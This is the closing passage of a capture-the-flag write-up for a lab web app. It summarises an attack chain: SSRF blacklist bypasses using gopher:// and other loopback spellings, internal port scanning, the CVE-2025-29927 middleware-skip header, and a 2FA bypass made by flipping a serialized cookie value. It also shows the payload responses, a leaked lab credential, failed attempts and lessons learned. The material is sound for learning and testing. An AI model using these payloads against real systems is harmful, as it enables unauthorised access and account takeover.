With the flipped cookie as the first request on a fresh session, control and payload side by side:

```
===== CONTROL untouched b:0 (fresh session)
HTTP/1.1 200 OK | 1361 bytes
<title>TryBookMe - 2FA Verification</title>  ...  <input name="code" maxlength="6">

===== PAYLOAD flipped   b:1 (fresh session)
HTTP/1.1 200 OK | 489 bytes
<title>2FA Complete - TryBookMe</title>
  <h4 class="alert-heading">Congratulations!</h4>
  <p>Here's the second flag: THM{[redacted]}</p>
```

The 2FA code was never known, never guessed and never brute-forced. The gate was simply asked to
check a value the attacker was holding.

---

## The chain, end to end

1. **Information disclosure** — `.preview.php.swp`, a nano swap file left in the web root by a
   rushed edit. Names the OS user, the host, and the file that was mid-change.
2. **SSRF** — `preview.php?url=` fetches any URL server-side. Its blacklist is a substring match
   (`file:/`, `php://`, `data://`, `dict://`, `ftp://`, `ip://`, `localhost`) that forgets
   `gopher://` and blocks only the *word* `localhost` while `127.0.0.1`, `127.1`, `[::1]`, `0.0.0.0`
   and `2130706433` all work.
3. **Access-control bypass** — `/management/` says `Access denied.` to the world, and serves its
   login page to a request the server makes to itself.
4. **Internal service discovery** — a `gopher://` scan of loopback finds a Next.js app on port
   10000, invisible to an external scan of all 65 535 ports.
5. **CVE-2025-29927** — `x-middleware-subrequest: middleware` skips the middleware that is the only
   guard on `/customapi`. → **flag 1** and `librarian:L1br4r1AN!!`.
6. **Client-side trust / insecure deserialization** — the portal keeps its 2FA state in an unsigned
   serialized PHP object in a cookie. `b:0` → `b:1`. → **flag 2**.

## What was tried and did not work

Kept in, because the failures are most of the lesson.

| Attempt | Result | Why it was worth trying |
|---|---|---|
| `file://`, `php://filter` for source disclosure | blocked by the blacklist | The obvious first move against a URL fetcher |
| Case variation `FILE://`, `File://`, `fiLe://` | all blocked — the filter lowercases first | PHP wrappers are case-insensitive; naive filters often are not |
| Reading `preview.php`'s source | never achieved | Would have handed over the blacklist and the fetch code |
| The nano swap file's contents | header only, 36 non-null bytes | Nano swaps usually carry the buffer; this one was empty |
| Downloading the Next.js JS bundles | all six were 404 pages | Read client-side JS first — but check that it *is* JS |
| Guessing API routes `/api`, `/api/books` | 404 | Cheap to try |
| 14 header variations against the middleware | all still 307 | Ruled out "the middleware wants a credential" |
| `ffuf` sweeps of the web root, `/management/`, the internal API | nothing new — and the `/management/` sweep could never have found `2fa.php`, since `common.txt` has no entry `2fa` | A wordlist's "nothing" means "nothing from my wordlist" |
| gopher port scan v1 (empty path) | called port 80 closed | Only detected services that greet first |
| gopher port scan v2 (`%0d%0a` payload) | every control failed | Changed payload *and* encoding at once |
| Flipped cookie tested after a malformed control | 302, looked like a failure | The control had destroyed the session |

## Five things to take away

1. **Read every static file before invoking anything.** The homepage's own JavaScript named the
   vulnerable endpoint, the parameter, and the fact that the fetch was server-side.
2. **A blacklist is a list of what its author remembered.** `file:/` and `php://` were blocked;
   `gopher://` was not, and `gopher://` was the stronger primitive. `localhost` was blocked; five
   other spellings of the same address were not.
3. **Every sweep carries a positive and a negative control, in the same run, read first.** Three
   separate instruments lied in this room — the port scanner called port 80 closed, six 404 pages
   posed as JavaScript bundles, and "could not be found" appeared in every response including the
   good ones.
4. **When a result surprises you, stop and explain it before doing anything else.** The 307 hiding
   behind a followed redirect, and the flipped cookie that worked only when it went first, were both
   sitting in output already collected.
5. **Byte counts are evidence.** 14 bytes vs 279 said "the application refused you, not the web
   server". 276 bytes was the 404 signature that made every negative trustworthy. 1024 bytes with 36
   non-null said "header only, no source in here". Six files within 12 bytes of each other said "your
   instrument is broken".
